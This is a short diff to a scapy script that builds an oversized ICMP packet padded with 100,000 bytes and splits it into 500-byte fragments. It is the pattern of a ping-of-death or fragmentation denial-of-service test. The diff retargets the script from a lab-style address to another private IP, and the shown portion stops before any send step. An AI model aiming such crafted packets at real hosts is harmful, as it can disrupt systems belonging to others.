@@ -1,9 +1,9 @@
 from scapy.all import *
-dip="10.0.2.4"
+dip="192.168.1.106"
 
 
 ip_hdr = IP(dst=dip)
-packet = ip_hdr/ICMP()/("m"*100000) #send 60k bytes of junk
+packet = ip_hdr/ICMP()/("m"*100000) 
 
 frags=fragment(packet,fragsize=500)
 
